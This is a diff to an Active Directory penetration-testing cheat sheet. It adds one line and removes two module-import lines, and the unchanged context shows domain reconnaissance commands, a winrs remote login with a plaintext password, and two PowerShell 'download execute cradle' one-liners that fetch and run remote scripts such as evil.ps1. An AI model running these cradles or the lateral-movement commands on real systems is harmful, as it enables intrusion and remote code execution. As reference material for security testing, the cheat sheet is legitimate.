@@ -69,6 +69,7 @@ Commands for initial reconnaissance including system info, network stats, and us
 - **User Privileges:** `whoami /priv`
 - **User Group Memberships:** `whoami /groups`
 - **SMB Shares:** `net share`
+- **All the commands in a module can be listed with:** `Get-Command -Module <modulename>`
 - **Shares on Hosts in Current Domain:** `Invoke-ShareFinder–Verbose`
 - **Sensitive File Finder in Domain:** `Invoke-FileFinder–Verbose`
 - **File Servers of the Domain:** `Get-NetFileServer`
@@ -288,10 +289,7 @@ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
 
 # Load a PowerShell script using dot sourcing
 `. C:\AD\Tools\PowerView.ps1`
-# A module (or a script) can be imported with:
-`Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
-# All the commands in a module can be listed with:
-`Get-Command -Module <modulename>`
+
 # Download execute cradle
 `iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
 `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
